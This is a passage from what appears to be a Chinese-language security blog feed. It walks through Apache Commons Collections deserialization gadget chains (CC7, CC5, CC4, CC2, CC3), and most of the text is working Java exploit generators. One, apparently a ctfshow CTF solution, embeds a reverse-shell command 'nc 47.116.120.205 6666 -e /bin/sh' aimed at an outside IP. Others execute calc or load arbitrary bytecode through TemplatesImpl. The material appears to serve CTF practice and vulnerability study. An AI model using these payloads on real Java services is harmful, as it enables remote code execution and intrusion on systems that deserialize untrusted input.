punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>encodedURL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="web853"><a href="#web853" class="headerlink" title="web853"></a>web853</h1><p>CC7链改下版本导包</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.map.LazyMap;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.util.Base64;import java.util.HashMap;import java.util.Hashtable;import java.util.Map;public class ctfshow &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;nc 47.116.120.205 6666 -e &#x2F;bin&#x2F;sh&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(new Transformer[]&#123;&#125;);        HashMap&lt;Object, Object&gt; hashMap1 &#x3D; new HashMap&lt;&gt;();        HashMap&lt;Object, Object&gt; hashMap2 &#x3D; new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; lazyMap1 &#x3D; LazyMap.lazyMap(hashMap1, chainedTransformer);        lazyMap1.put(&quot;yy&quot;, 1);        Map&lt;Object,Object&gt; lazyMap2 &#x3D; LazyMap.lazyMap(hashMap2, chainedTransformer);        lazyMap2.put(&quot;zZ&quot;, 1);        Hashtable hashtable &#x3D; new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 1);        Class c &#x3D; ChainedTransformer.class;        Field field &#x3D; c.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(chainedTransformer, transformers);        lazyMap2.remove(&quot;yy&quot;);        serialize(hashtable);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(byteArrayOutputStream);        oos.writeObject(obj);        oos.close();        byte[] serializedBytes &#x3D; byteArrayOutputStream.toByteArray();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(serializedBytes);        StringBuilder encodedBuilder &#x3D; new StringBuilder();        for (char c : base64Encoded.toCharArray()) &#123;            encodedBuilder.append(&quot;%&quot;).append(Integer.toHexString(c).toUpperCase());        &#125;        String encodedURL &#x3D; encodedBuilder.toString();        System.out.println(encodedURL);    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collection CC5链</title>
      <link href="/2024/11/11/2024-09-18-Commons-Collection%20CC5%E9%93%BE/"/>
      <url>/2024/11/11/2024-09-18-Commons-Collection%20CC5%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="链分析"><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h2><pre class="language-none"><code class="language-none">&#x2F;*Gadget chain:        ObjectInputStream.readObject()            BadAttributeValueExpException.readObject()                TiedMapEntry.toString()                    LazyMap.get()                        ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()Requires:commons-collections *&#x2F;</code></pre><p>跟CC1的LazyMap链差不多,就是<code>LazyMap.get</code>的调用改成了<code>TiedMapEntry.toString</code></p><pre class="language-none"><code class="language-none">public String toString() &#123;    return getKey() + &quot;&#x3D;&quot; + getValue();&#125;public Object getValue() &#123;return map.get(key);&#125;</code></pre><p><code>toString</code>的<code>getValue</code>方法调用了<code>get</code>,这里的map是可以控制的</p><pre class="language-none"><code class="language-none">public TiedMapEntry(Map map, Object key) &#123;    super();    this.map &#x3D; map;    this.key &#x3D; key;&#125;</code></pre><p> 简单构造一下</p><pre class="language-none"><code class="language-none">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class CC5 &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;admin123&quot;);        Map&lt;Object, Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(layzMap, 1);        tiedMapEntry.toString();    &#125;&#125;</code></pre><p>找一个重写了<code>readObject</code>并且调用<code>toString</code>的,这里找到了<code>BadAttributeValueExpException</code>类</p><p>这里调用了<code>toString</code>方法</p><p>![](\images\posts\Commons-Collection CC5链\1726634339750.jpg)</p><p>这里<code>readFields</code>读字段,然后从里面读<code>val</code>属性.看构造函数,<code>val</code>可控.这里就可以形成链</p><pre class="language-none"><code class="language-none">public BadAttributeValueExpException (Object val) &#123;    this.val &#x3D; val &#x3D;&#x3D; null ? null : val.toString();&#125;</code></pre><h2 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h2><p>构造函数执行时会调用<code>toString</code>方法,所以先随便写一个后面再通过反射改回来</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class CC5 &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(layzMap,1);&#x2F;&#x2F;        tiedMapEntry.toString();        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(null);  &#x2F;&#x2F;随便写        Class c &#x3D; badAttributeValueExpException.getClass();        Field declaredField &#x3D; c.getDeclaredField(&quot;val&quot;);        declaredField.setAccessible(true);        declaredField.set(badAttributeValueExpException,tiedMapEntry);&#x2F;&#x2F;        serialize(badAttributeValueExpException);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="链分析-1"><a href="#链分析-1" class="headerlink" title="链分析"></a>链分析</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collection CC4链2链</title>
      <link href="/2024/11/11/2024-09-17-Commons-Collection%20CC4%E9%93%BE2%E9%93%BE/"/>
      <url>/2024/11/11/2024-09-17-Commons-Collection%20CC4%E9%93%BE2%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h2 id="链分析"><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h2><p>利用点仍然是<code>transform</code>，查找调用<code>transform</code>方法,找到<code>TransformingComparator</code>类的<code>compare</code>方法 ,<code>compare</code>也比较常见</p><pre class="language-none"><code class="language-none">public int compare(final I obj1, final I obj2) &#123;    final O value1 &#x3D; this.transformer.transform(obj1);    final O value2 &#x3D; this.transformer.transform(obj2);    return this.decorated.compare(value1, value2);&#125;</code></pre><p>继续查找谁的<code>readObject</code>调用了<code>compare</code>,后面查找到<code>PriorityQueue</code>类中<code>readObject</code>调用了<code>compare</code>方法</p><p>![](\images\posts\Commons-Collection CC4链2链\1726548340115.jpg)</p><p>跟进<code>heapify</code>,再跟进<code>siftDown</code>,再跟进<code>siftDownUsingComparator</code>,在<code>siftDownUsingComparator</code>中调用的<code>compare</code>方法</p><p>![](\images\posts\Commons-Collection CC4链2链\1726548417986.jpg)</p><p>链子就是:</p><blockquote><p>InstantiateTransformer.transform&lt;&#x3D;&#x3D;TransformingComparator.compare&lt;&#x3D;&#x3D;PriorityQueue.readObject</p></blockquote><h2 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h2><p>之前CC3的前半部分不变</p><pre class="language-none"><code class="language-none">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4 &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        TransformingComparator transformingComparator &#x3D; new TransformingComparator(chainedTransformer);        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);        serialize(priorityQueue);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题:"></a>解决问题:</h3><p>未弹出计算器,<code>heapify</code>方法打断点调试,可以发现在<code>heapify</code>方法里面<code>size</code>为0,减一后变成了-1没有进入for循环,没有执行<code>siftDown</code>方法.</p><p>![](\images\posts\Commons-Collection CC4链2链\1726549378671.jpg)</p><p>可以通过反射修改size的值</p><h3 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h3><pre class="language-none"><code class="language-none">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4 &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        TransformingComparator transformingComparator &#x3D; new TransformingComparator(chainedTransformer);        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);        Class aClass &#x3D; PriorityQueue.class;        Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(priorityQueue,2);        serialize(priorityQueue);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p>![](\images\posts\Commons-Collection CC4链2链\1726549626486.jpg)</p><p>另外一种方法:<code>size</code>是<code>PriorityQueue</code>这个队列的长度</p><p>![](\images\posts\Commons-Collection CC4链2链\1726550565576.jpg)</p><p>所以可以用<code>add</code>添加队列,但是add后也会调用到<code>compare</code>方法,导致在反序列化之前就在本地执行了</p><p>跟进<code>add</code>&#x3D;&gt;<code>offer</code>&#x3D;&gt;<code>siftUp</code>&#x3D;&gt;<code>siftUpUsingComparator</code></p><p>![](\images\posts\Commons-Collection CC4链2链\1726550853998.jpg)</p><p>所以在前面随便改一个值,<code>add</code>后又改回来就行</p><pre class="language-none"><code class="language-none">ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(new ChainedTransformer&lt;&gt;());        Class chainedClass &#x3D; chainedTransformer.getClass();Field declaredField &#x3D; chainedClass.getDeclaredField(&quot;iTransformers&quot;);declaredField.setAccessible(true);declaredField.set(chainedTransformer,transformers);</code></pre><p>或者</p><pre class="language-none"><code class="language-none">TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ChainedTransformer());        Class transformingComparatorClass &#x3D; transformingComparator.getClass();        Field declaredField &#x3D; transformingComparatorClass.getDeclaredField(&quot;transformer&quot;);        declaredField.setAccessible(true);        declaredField.set(transformingComparator,chainedTransformer);</code></pre><p>都行</p><h3 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h3><pre class="language-none"><code class="language-none">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4 &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ChainedTransformer());        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(3);        priorityQueue.add(2);        Class transformingComparatorClass &#x3D; transformingComparator.getClass();        Field declaredField &#x3D; transformingComparatorClass.getDeclaredField(&quot;transformer&quot;);        declaredField.setAccessible(true);        declaredField.set(transformingComparator,chainedTransformer);        serialize(priorityQueue);&#x2F;&#x2F;        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p>![](\images\posts\Commons-Collection CC4链2链\1726551808546.jpg)</p><h1 id="CC2链"><a href="#CC2链" class="headerlink" title="CC2链"></a>CC2链</h1><h2 id="编写EXP-1"><a href="#编写EXP-1" class="headerlink" title="编写EXP"></a>编写EXP</h2><p>CC2和CC4差距不大,就是没有用<code>Transformer</code>数组,用<code>InvokerTransformer</code>直接连接,调用后面<code>templates</code> 对象的<code>newTransformer</code>方法</p><pre class="language-none"><code class="language-none">InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);</code></pre><p><code>transformingComparator</code>这里改一下,不能使用之前CC4随便new的<code>ChainedTransformer</code>,因为 <code>PriorityQueue</code> 的排序是基于比较器的返回值进行的,<code>ChainedTransformer</code> 的执行过程会涉及多个 transformer 的调用，如果其中的某个 <code>transformer </code>返回了一个不合法的值，或者导致异常操作，它就可能会触发错误,而 <code>ConstantTransformer</code> 返回的值总是 <code>1</code>，这不会导致比较异常.</p><pre class="language-none"><code class="language-none">TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ChainedTransformer());</code></pre><p>最后在添加<code>TemplatesImpl</code>对象就可以</p><pre class="language-none"><code class="language-none">priorityQueue.add(templates);priorityQueue.add(2);</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC2 &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);        TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ConstantTransformer&lt;&gt;(1));        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(templates);        priorityQueue.add(2);        Class transformingComparatorClass &#x3D; transformingComparator.getClass();        Field declaredField &#x3D; transformingComparatorClass.getDeclaredField(&quot;transformer&quot;);        declaredField.setAccessible(true);        declaredField.set(transformingComparator,invokerTransformer);        serialize(priorityQueue);&#x2F;&#x2F;        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collection CC3链</title>
      <link href="/2024/11/11/2024-09-16-Commons-Collection%20CC3%E9%93%BE/"/>
      <url>/2024/11/11/2024-09-16-Commons-Collection%20CC3%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="链分析："><a href="#链分析：" class="headerlink" title="链分析："></a>链分析：</h1><p>CC3是利用动态类加载执行任意代码。</p><p>利用点是<code>defineClass</code>方法。<code>defineClass</code>调用<code>newInstance </code>进行初始化执行任意代码</p><p>一般<code>defineClass</code>都是 protected类型的，要调用<code>defineClass</code>不能用protected方法。全局查找<code>definClass</code>方法找到</p><p><code>TemplatesImpl</code>类中调用了<code>defineClass</code>方法,没有修饰符默认是default方法。</p><p>![](\images\posts\Commons-Collection CC3链\1726466066821.jpg)</p><p>再查找谁调用了<code>defineClass</code>。<code>TemplatesImpl</code>下的<code>defineTransletClasses</code>调用了<code>defineClass</code></p><p>![](\images\posts\Commons-Collection CC3链\1726466892495.jpg)</p><p><code>defineTransletClasses</code>是一个私有方法，继续查找调用。找到了<code>getTransletInstance</code>方法,调用了<code>defineTransletClasses</code>方法，还顺带调用了<code>newInstance</code>.所以重点关注<code>getTransletInstance</code>函数</p><p>![](\images\posts\Commons-Collection CC3链\1726467523849.jpg)</p><p><code>getTransletInstance</code>也是一个私有方法，继续查找调用。最后查找到<code>newTransformer</code>类里面调用了<code>getTransletInstance</code>方法，这个类是公有的，链子到这里结束。</p><p>![](\images\posts\Commons-Collection CC3链\1726467694276.jpg)</p><p><code>defineClass</code>&lt;&#x3D;&#x3D;<code>defineTransletClasses</code>&lt;&#x3D;&#x3D;<code>getTransletInstance</code>&lt;&#x3D;&#x3D;<code>newTransformer</code></p><p>跟进<code>getTransletInstance</code>，要调用<code>defineTransletClasses</code>_name不能为null, _class必须为null</p><p>![](\images\posts\Commons-Collection CC3链\1726468331019.jpg)</p><p>跟进<code>defineTransletClasses</code>，_bytecodes不能等于null，否则报错。 _tfactory会调用<code>getExternalExtensionsMap</code>要有值</p><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><p>通过反射给_name、 _bytecodes、 _tfactory。 _name是String类型， _bytecodes是二维数组</p><p>![](\images\posts\Commons-Collection CC3链\1726468819678.jpg)</p><p>但是defineClass调用传递的值是一维数组，用for循环遍历进去</p><p>![](\images\posts\Commons-Collection CC3链\1726469527117.jpg)</p><p>所以可以嵌套进去</p><pre class="language-none"><code class="language-none">byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));byte[][] codes &#x3D; &#123;code&#125;;</code></pre><p>_tfactory是transient类型，就是不能被序列化，反射修改后也不会被序列化进去</p><p>![](\images\posts\Commons-Collection CC3链\1726469798573.jpg)</p><p>所以肯定在readObject里面传了值</p><p>![](\images\posts\Commons-Collection CC3链\1726470193619.jpg)</p><p>这里方便调试一下先给_tfactory赋值new TransformerFactoryImpl()</p><pre class="language-none"><code class="language-none">public class CC3 &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates,new TransformerFactoryImpl());        templates.newTransformer();    &#125;&#125;</code></pre><p>这里报错空指针异常，打断点调试</p><p>![](\images\posts\Commons-Collection CC3链\1726470779133.jpg)</p><p>类加载成功,<code>_auxClasses</code>为null导致的错误</p><p>![](\images\posts\Commons-Collection CC3链\1726470898807.jpg)</p><p>因为上面看到<code>_transletIndex</code>值是-1，下面有判断如果<code>transletIndex</code>小于0就报错，所以只能让它equals ABSTRACT_TRANSLET。</p><pre class="language-none"><code class="language-none">private static String ABSTRACT_TRANSLET&#x3D;&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</code></pre><p>执行代码的类导入这个类，<code>AbstractTranslet</code>是个抽象方法，重写他的两个方法。最后的恶意类就是</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span 